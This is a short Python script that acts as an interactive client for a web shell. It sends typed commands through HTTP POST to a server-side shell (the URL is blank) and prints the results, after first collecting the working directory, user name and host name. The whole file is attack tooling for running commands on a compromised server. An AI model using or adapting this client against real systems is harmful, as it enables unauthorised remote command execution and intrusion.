import httpx
import json

url = ""

def send_cmd(cmd):
	result = httpx.post(url = url, data = {'comando':cmd}, timeout=None)
	return json.loads(result.text)['valor']

pwd = send_cmd('pwd').replace('\n','')
whoami = send_cmd('whoami').replace('\n','')
hostname = send_cmd('hostname').replace('\n','')

try:

	while True:

		print(f"{whoami}@{hostname} $ ", end='')
		cmd = input()
		print(send_cmd(cmd))

except KeyboardInterrupt:
	print('\nWebshell terminated.')
	exit()